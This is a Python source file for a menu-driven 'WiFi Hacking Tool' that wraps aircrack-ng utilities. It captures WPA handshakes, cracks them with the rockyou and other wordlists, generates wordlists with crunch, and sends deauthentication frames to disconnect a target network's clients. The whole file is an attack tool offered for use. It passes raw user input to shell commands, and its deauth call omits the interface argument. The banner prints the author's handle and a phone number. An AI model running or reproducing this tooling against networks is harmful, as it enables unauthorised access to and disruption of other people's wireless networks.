import os
import subprocess
from termcolor import colored

# تعريف الألوان
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def cted():
    bssid = input("Enter MAC address for network: ")
    channel = input("Enter channel network: ")
    network_interface = input("Enter network interface: ")
    os.system(f"sudo airodump-ng {network_interface} -w ~/Desktop/handshk -c {channel} --bssid {bssid}")

def crack_handshake():
    handshake_file = input("Enter the name of the handshake file (without extension): ")
    print(YELLOW + "Choose the type of cracking:" + RESET)
    print("1. Use default wordlists in Kali Linux")
    print("2. Provide a custom wordlist file")
    choice = int(input("Enter your choice (1 or 2): "))
    
    if choice == 1:
        # استخدام ملفات كلمة السر الافتراضية الموجودة في نظام Kali
        default_wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt",
            "/usr/share/wordlists/common.txt"
        ]
        print(GREEN + "Using default wordlists..." + RESET)
        for wordlist in default_wordlists:
            if os.path.exists(wordlist):
                print(f"{GREEN}Cracking with wordlist: {wordlist}{RESET}")
                subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo aircrack-ng ~/Desktop/{handshake_file}.cap -w {wordlist}; exec bash"])
            else:
                print(f"{RED}Wordlist not found: {wordlist}{RESET}")
    
    elif choice == 2:
        # السماح للمستخدم بإدخال ملف تخمين خاص به
        custom_wordlist = input("Enter the path to your custom wordlist file: ")
        if os.path.exists(custom_wordlist):
            print(f"{GREEN}Cracking with custom wordlist: {custom_wordlist}{RESET}")
            os.system(f"sudo aircrack-ng ~/Desktop/{handshake_file}.cap -w {custom_wordlist}")
        else:
            print(f"{RED}Custom wordlist not found at: {custom_wordlist}{RESET}")
    
    else:
        print(RED + "Invalid choice. Returning to main menu..." + RESET)

def crunch():
    between = input("Enter the range for crunch (e.g., 1 8): ")
    output_file = input("Enter the output file name (e.g., wordlist.txt): ")
    min_length, max_length = map(int, between.split())
    os.system(f"crunch {min_length} {max_length} -o {output_file}")
    print(f"{GREEN}Wordlist created successfully and saved to {output_file}{RESET}")

def disconnect_network():
    try:
        mac = input("Enter the MAC address for network: ")
        os.system(f"sudo aireplay-ng --deauth 10 -a {mac}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

def uesr_in():
    try:
        network_interface = input("Enter network interface: ")
        os.system(f"sudo airodump-ng {network_interface}")
    except Exception as e:
        print(RED + f"Error: {e}" + RESET)

def main():
    header = """
    >>===========================================================<<
    ||               _               _          _              _ ||
    ||__      ____ _| |__   ___  ___| |__      | |_ ___   ___ | ||
    ||\ \ /\ / / _` | '_ \ / _ \/ _ \ '_ \     | __/ _ \ / _ \| ||
    || \ V  V / (_| | | | |  __/  __/ |_) |    | || (_) | (_) | ||
    ||  \_/\_/ \__,_|_| |_|\___|\___|_.__/      \__\___/ \___/|_||
    >>===========================================================<<
                  ______
                .-'      `-.
               /            \\
               |             |
               |,  .-.  .-.  ,|
               | )(__/  \__)( |
               |/     /\     \|
               (_     ^^     _)
                \__|IIIIII|__/
                 \  |-----|  /
                  `---.---'
                    _|_|_
                   /_|_|_\ 
    github:https://github.com/waheeb71/WiFi-Hacking-Tool.git                     
    telegram:SyberSc71
    phone number=+967712266013
    >>===========================================================<<
    """
    print(colored(header, 'green'))
    
    print(YELLOW + "Welcome to the WiFi Hacking Tool @waheeb" + RESET)
    print(RED + "1. Capture Handshake")
    print("2. Crack Handshake")
    print("3. Generate Wordlist with Crunch")
    print("4. Disconnect Network")
    print("5. Start Airodump-ng")
    print("6. Exit" + RESET)
    
    choice = int(input("Choose an option: "))
    if choice == 1:
        cted()
    elif choice == 2:
        crack_handshake()
    elif choice == 3:
        crunch()
    elif choice == 4:
        disconnect_network()
    elif choice == 5:
        uesr_in()
    elif choice == 6:
        print(GREEN + "Exiting..." + RESET)
        exit()
    else:
        print(RED + "Invalid choice. Please try again." + RESET)
        main()

if __name__ == "__main__":
    main()